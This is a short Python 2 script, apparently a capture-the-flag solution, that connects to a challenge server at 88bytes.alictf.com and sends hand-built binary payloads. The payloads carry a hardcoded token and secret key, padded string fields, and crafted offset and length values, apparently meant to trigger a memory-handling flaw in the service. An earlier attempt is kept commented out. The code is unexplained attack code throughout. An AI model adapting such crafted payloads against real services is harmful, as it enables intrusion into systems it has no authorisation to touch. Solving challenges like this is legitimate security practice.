import socket

hostname = '88bytes.alictf.com'
port = 30000
len_token = '\x20'
token = '995b354f373e1de2966699a0723e8969'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((hostname,port))
'''
function_id = '\x01'
network_len_data = '\x00\x00\x01\x3f'
str1_len = '\x1e'
str1 = 'a'*30 + '\x00'*98
str2_len = '\x1e'
str2 = 'b'*30 + '\x00'*98
pos = '\xcc\xcc' + '\x03\x00\x00\x00'
len_data = '\x00'
secretKey = "c4852c709698e3270a9966692ed1e373f453b599e5aca3e6\x00\x00"
logRequest = '\x01\x01\x01\x01'

payload = ''
payload += len_token
payload += token
payload += function_id
payload += network_len_data
payload += str1_len
payload += str1
payload += str2_len
payload += str2
payload += pos
payload += len_data
payload += secretKey
payload += logRequest

s.send(payload)
print s.recv(1024)
'''
#----------------
function_id = '\x06'
network_len_data = '\x00\x00\x01\x3c'
#data
    #len_str_t
str1_len = '\x00'
str1 = '\x00'*128
str2_len = '\x00'
str2 = '\x00'*128
pos = '\xcc\xcc'+'\xc8\x00\x00\x00'
len_data = '\x80'
secretKey = 'c4852c709698e3270a9966692ed1e373f453b599e5aca3e6\x00\x00'
logRequest = '\x01'


payload = ''
payload += len_token
payload += token
payload += function_id
payload += network_len_data
payload += str1_len
payload += str1
payload += str2_len
payload += str2
payload += pos
payload += len_data
payload += secretKey
payload += logRequest

s.send(payload)
print s.recv(1024)
